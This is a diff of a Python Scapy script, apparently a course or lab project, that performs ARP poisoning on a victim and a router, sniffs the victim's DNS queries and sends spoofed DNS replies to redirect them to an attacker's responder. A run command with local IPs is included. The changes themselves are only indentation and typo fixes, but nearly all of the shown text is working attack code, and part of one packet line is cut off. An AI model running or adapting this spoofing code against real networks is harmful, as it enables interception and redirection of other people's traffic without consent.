@@ -12,11 +12,11 @@
 --
 --  DESIGNERS: Kyle Gilles & Clemens Lo
 --
---	TO RUN: python spoof.py -v 192.168.0.7 -r 192.168.0.100 -d 192.168.0.6 -i 192.168.0.8
+--  TO RUN: python spoof.py -v 192.168.0.7 -r 192.168.0.100 -d 192.168.0.6 -i 192.168.0.8
 --
 --  NOTES:
 --  Our Attacking machine initiates ARP Poisoning on the victim machine. 
---	We will sniff for their DNS requests, then create a spoofed packet that will 
+--  We will sniff for their DNS requests, then create a spoofed packet that will 
 --  redirect them to our target DNS responder.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 #!/usr/bin/env python
@@ -68,7 +68,7 @@ def getMAC(IP):
 
 #constructs and sends arp packets to send to router and to victim. 
 def poison(localMAC, victimMAC, routerMAC):
-	#construct packets
+    #construct packets
     arpPacketVictim = Ether(src=localMAC, dst=victimMAC)/ARP(hwsrc=localMAC, hwdst=victimMAC, psrc=routerIP, pdst=victimIP, op=2)
     arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=victimIP, pdst=routerIP, op=2)
 
@@ -84,7 +84,7 @@ def poison(localMAC, victimMAC, routerMAC):
             sys.exit(0)
 
 
-#construc and send a spoofed DNS response packet to the victim
+#construct and send a spoofed DNS response packet to the victim
 def respond(packet):
     global targetIP
     responsePacket = (IP(dst=victimIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
@@ -98,17 +98,17 @@ def respond(packet):
 #this parse creates a thread
 def parse(packet):
     #qr==0 is a dns request
-	if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
-		respondThread = threading.Thread(target=respond, args=packet)
-		respondThread.start()
+    if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
+        respondThread = threading.Thread(target=respond, args=packet)
+        respondThread.start()
 
 
 #this parse creates a process
 #def parse (packet):
-#	if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
-#		responseProcess = Process(target=respond, args=packet)
-#	    responseProcess.start()
-#		esponseProcess.join()
+#    if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
+#        responseProcess = Process(target=respond, args=packet)
+#        responseProcess.start()
+#        responseProcess.join()
 
 
 #initiate sniff filter for DNS requests
